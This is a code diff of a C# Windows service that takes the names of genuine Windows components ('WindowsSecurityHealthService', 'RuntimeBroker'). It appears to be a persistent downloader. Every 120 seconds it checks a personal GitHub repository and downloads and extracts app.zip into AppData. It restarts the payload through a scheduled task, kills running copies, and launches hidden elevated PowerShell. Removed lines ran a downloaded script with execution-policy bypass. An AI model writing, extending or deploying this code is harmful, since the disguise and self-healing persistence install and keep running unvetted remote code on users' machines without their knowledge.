@@ -4,7 +4,9 @@ using System.ComponentModel;
 using System.Data;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
+using System.Management;
 using System.Net;
 using System.ServiceProcess;
 using System.Text;
@@ -15,12 +17,13 @@ namespace WindowsSecurityHealthService
     partial class SecurityHealthService : ServiceBase
     {
         static string versionUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/version";
-        static string scriptUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/install.ps1";
-        static string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
-        static string currentDir = Path.Combine(appDataPath, @"Microsoft\RuntimeBroker");
+        static string appZipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip";
+        static string userProfilePath = $"C:\\Users\\{GetUserName()}";
+        static string localAppDataPath = Path.Combine(userProfilePath, "AppData", "Local");
+        static string currentDir = Path.Combine(localAppDataPath, @"Microsoft\RuntimeBroker");
         static string assemblyFile = Path.Combine(currentDir, "RuntimeBroker.exe");
-        static string tempScriptPath = Path.Combine(Path.GetTempPath(), "install.ps1"); 
         static string taskName = "RuntimeBroker";
+        static string tempZipPath = Path.Combine(Path.GetTempPath(), "app.zip");
 
         public SecurityHealthService()
         {
@@ -29,6 +32,23 @@ namespace WindowsSecurityHealthService
 
         protected override void OnStart(string[] args)
         {
+
+            Trace.Listeners.Clear();
+            string appLogPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"app.log");
+            TextWriterTraceListener twtl = new TextWriterTraceListener(appLogPath);
+            twtl.Name = "TextLogger";
+            twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
+
+            ConsoleTraceListener consoleTraceListener = new ConsoleTraceListener();
+            consoleTraceListener.Name = "TextLogger";
+            consoleTraceListener.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
+
+            Trace.Listeners.Add(twtl);
+            Trace.Listeners.Add(consoleTraceListener);
+
+            Trace.AutoFlush = true;
+            Trace.WriteLine("===================");
+            Trace.WriteLine("U:" + localAppDataPath);
             // TODO: Add code here to start your service.
 
             int time = (int)TimeSpan.FromSeconds(120).TotalMilliseconds;
@@ -51,62 +71,45 @@ namespace WindowsSecurityHealthService
                         {
                             if (assemblyVersion == null)
                             {
-                                Console.WriteLine("A newer version is available. Downloading and running the update script...");
+                                Trace.WriteLine("A newer version is available. Downloading and running the update script...");
                                 DownloadAndRunScript();
                             }
                             else
                             {
-                                Console.WriteLine($"Server Version: {serverVersion}");
-                                Console.WriteLine($"Assembly Version: {assemblyVersion}");
+                                Trace.WriteLine($"Server Version: {serverVersion}");
+                                Trace.WriteLine($"Assembly Version: {assemblyVersion}");
 
                                 if (new Version(assemblyVersion) < new Version(serverVersion))
                                 {
-                                    Console.WriteLine("A newer version is available. Downloading and running the update script...");
+                                    Trace.WriteLine("A newer version is available. Downloading and running the update script...");
                                     DownloadAndRunScript();
                                 }
                                 else
                                 {
-                                    Console.WriteLine("No update is needed. The assembly version is up-to-date.");
+                                    Trace.WriteLine("No update is needed. The assembly version is up-to-date.");
+
+                                    // Check if Runtimebroker not running
+                                    if (!IsProcessRunning(assemblyFile))
+                                    {
+                                        Console.WriteLine("Checking if the RuntimeBroker task exists");
+                                        if (IsTaskExist(taskName))
+                                        {
+                                            Trace.WriteLine("Run the RuntimeBroker task");
+                                            RunScheduledTask(taskName);
+                                        }
+                                        else
+                                        {
+                                            Trace.WriteLine("Task does not exist, downloading and running the script");
+                                            DownloadAndRunScript();
+                                        }
+                                    }
                                 }
                             }
                         }
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine(ex.Message);
-                    }
-                    finally
-                    {
-                        await Task.Delay(time);
-                    }
-                }
-            });
-
-            Task.Run(async () =>
-            {
-                while (true)
-                {
-                    try
-                    {
-                        // Check if Runtimebroker not running
-                        if (!IsProcessRunning(assemblyFile))
-                        {
-                            Console.WriteLine("Checking if the RuntimeBroker task exists");
-                            if (IsTaskExist(taskName))
-                            {
-                                Console.WriteLine("Run the RuntimeBroker task");
-                                RunScheduledTask(taskName);
-                            }
-                            else
-                            {
-                                Console.WriteLine("Task does not exist, downloading and running the script");
-                                DownloadAndRunScript();
-                            }
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine(ex.Message);
+                        Trace.WriteLine(ex.Message);
                     }
                     finally
                     {
@@ -127,6 +130,25 @@ namespace WindowsSecurityHealthService
             OnStart(args);
         }
 
+        private static string GetUserName()
+        {
+            SelectQuery query = new SelectQuery(@"Select * from Win32_Process");
+            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+            {
+                foreach (System.Management.ManagementObject Process in searcher.Get())
+                {
+                    if (Process["ExecutablePath"] != null && string.Equals(Path.GetFileName(Process["ExecutablePath"].ToString()), "explorer.exe", StringComparison.OrdinalIgnoreCase))
+                    {
+                        string[] OwnerInfo = new string[2];
+                        Process.InvokeMethod("GetOwner", (object[])OwnerInfo);
+                        return OwnerInfo[0];
+                    }
+                }
+            }
+
+            return "";
+        }
+
         static string GetServerVersion()
         {
             try
@@ -139,7 +161,7 @@ namespace WindowsSecurityHealthService
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Failed to retrieve version from the server: {ex.Message}");
+                Trace.WriteLine($"Failed to retrieve version from the server: {ex.Message}");
                 return null;
             }
         }
@@ -148,12 +170,13 @@ namespace WindowsSecurityHealthService
         {
             try
             {
+                Trace.WriteLine($"assemblyFile: {assemblyFile}");
                 var versionInfo = FileVersionInfo.GetVersionInfo(assemblyFile);
                 return versionInfo.ProductVersion;
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Failed to retrieve version from the assembly file: {ex.Message}");
+                Trace.WriteLine($"Failed to retrieve version from the assembly file: {ex.Message}");
                 return null;
             }
         }
@@ -162,25 +185,86 @@ namespace WindowsSecurityHealthService
         {
             try
             {
-                using (WebClient client = new WebClient())
+                // Stop the scheduled task if it exists and is running
+                if (IsTaskExist(taskName))
                 {
-                    client.DownloadFile(scriptUrl, tempScriptPath);
+                    Trace.WriteLine("IsTaskExist");
+                    StopScheduledTask(taskName);
                 }
 
+                // Kill the process if it is running
+                if (IsProcessRunning(assemblyFile))
+                {
+                    Trace.WriteLine("KillProcess");
+                    KillProcess(assemblyFile);
+                }
+                Trace.WriteLine("Start download file");
+                // Download the zip file
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadFile(appZipUrl, tempZipPath);
+                }
+
+                // Extract the zip file to the current directory
+                if (Directory.Exists(currentDir))
+                {
+                    Directory.Delete(currentDir, true);
+                }
+                Trace.WriteLine("ExtractToDirectory");
+                ZipFile.ExtractToDirectory(tempZipPath, currentDir);
+
+                Trace.WriteLine("Downloaded and extracted app.zip successfully.");
+
+                RunScheduledTask(taskName);
+            }
+            catch (Exception ex)
+            {
+                Trace.WriteLine($"Failed to download or run the script: {ex.Message}");
+            }
+        }
+        static void KillProcess(string filePath)
+        {
+            var processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(filePath));
+            foreach (var process in processes)
+            {
+                if (process.MainModule.FileName.Equals(filePath, StringComparison.OrdinalIgnoreCase))
+                {
+                    process.Kill();
+                    process.WaitForExit();
+                    Trace.WriteLine($"Killed process {process.ProcessName} with PID {process.Id}");
+
+                }
+            }
+        }
+        static void StopScheduledTask(string taskName)
+        {
+            try
+            {
                 ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
                 {
-                    Arguments = $"-ExecutionPolicy Bypass -File \"{tempScriptPath}\"",
+                    Arguments = $"-Command \"Stop-ScheduledTask -TaskName '{taskName}'\"",
                     Verb = "runas",
                     UseShellExecute = true,
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden
                 };
 
-                Process.Start(startInfo);
+                using (Process process = Process.Start(startInfo))
+                {
+                    process.WaitForExit();
+                    if (process.ExitCode == 0)
+                    {
+                        Trace.WriteLine($"Stopped scheduled task '{taskName}' successfully.");
+                    }
+                    else
+                    {
+                        throw new Exception("Failed to stop the scheduled task.");
+                    }
+                }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Failed to download or run the script: {ex.Message}");
+                Trace.WriteLine($"Failed to stop the scheduled task: {ex.Message}");
             }
         }
 
@@ -207,7 +291,7 @@ namespace WindowsSecurityHealthService
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Failed to run the scheduled task: {ex.Message}");
+                Trace.WriteLine($"Failed to run the scheduled task: {ex.Message}");
             }
         }
 
@@ -235,7 +319,7 @@ namespace WindowsSecurityHealthService
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Failed to check if the task exists: {ex.Message}");
+                Trace.WriteLine($"Failed to check if the task exists: {ex.Message}");
                 return false;
             }
         }
